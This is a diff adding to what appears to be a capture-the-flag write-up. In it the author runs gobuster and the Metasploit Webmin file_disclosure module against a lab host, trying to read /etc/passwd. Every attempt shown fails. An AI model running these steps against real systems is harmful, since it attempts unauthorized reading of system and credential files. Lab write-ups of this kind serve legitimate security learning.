@@ -263,4 +263,58 @@ http-vuln-cve2006-3392:
 ```
 Alright then, let's give this attack Webmin on Port 10000 a shot based on a [guide](https://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure/) & [it's code](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/webmin/file_disclosure.rb).
 
+We also do some GoBusters, for example:
+```
+hippoeug@kali:~$ gobuster dir -u "https://10.10.10.7:10000" -w /usr/share/wordlists/dirbuster/directory-lis
+...
+Error: error on running goubster: unable to connect to https://10.10.10.7:10000/: invalid certificate: x509: cannot validate certificate for 10.10.10.7 because it doesn't contain any IP SANs
+...
+Error: error on running goubster: unable to connect to https://10.10.10.7/: invalid certificate: x509: certificate has expired or is not yet valid
+```
+Some errors as we can see. Let's move on first!
+
 ## 3. Attacking Webmin (Port 10000)
+Let's run this `auxiliary/admin/webmin/file_disclosure` exploit.
+```
+msf5 > use auxiliary/admin/webmin/file_disclosure
+
+msf5 auxiliary(admin/webmin/file_disclosure) > run
+[*] Running module against 10.10.10.7
+
+[*] Attempting to retrieve /etc/passwd...
+[-] Auxiliary failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
+[-] Call stack:
+[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:752:in `getpeername'
+[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:752:in `getpeername_as_array'
+[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:765:in `peerinfo'
+[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:640:in `peerinfo'
+[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:233:in `_send_recv'
+[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:211:in `send_recv'
+[-]   /usr/share/metasploit-framework/lib/msf/core/exploit/http/client.rb:336:in `send_request_raw'
+[-]   /usr/share/metasploit-framework/modules/auxiliary/admin/webmin/file_disclosure.rb:65:in `run'
+[*] Auxiliary module execution completed
+```
+Nope, didn't work. What about doing exploit instead?
+```
+msf5 auxiliary(admin/webmin/file_disclosure) > exploit
+[*] Running module against 10.10.10.7
+
+[*] Attempting to retrieve /etc/passwd...
+[*] The server returned: 200 Bad Request
+<h1>Error - Bad Request</h1>
+<pre>This web server is running in SSL mode. Try the URL <a href='https://10.10.10.7:10000/'>https://10.10.10.7:10000/</a> instead.<br></pre>
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(admin/webmin/file_disclosure) > set ssl true
+...
+msf5 auxiliary(admin/webmin/file_disclosure) > run
+[*] Running module against 10.10.10.7
+
+[*] Attempting to retrieve /etc/passwd...
+[*] The server returned: 404 File not found
+<h1>Error - File not found</h1>
+[*] Auxiliary module execution completed
+```
+Ah this works, but no file found.
+
+## 4. GoBuster..?
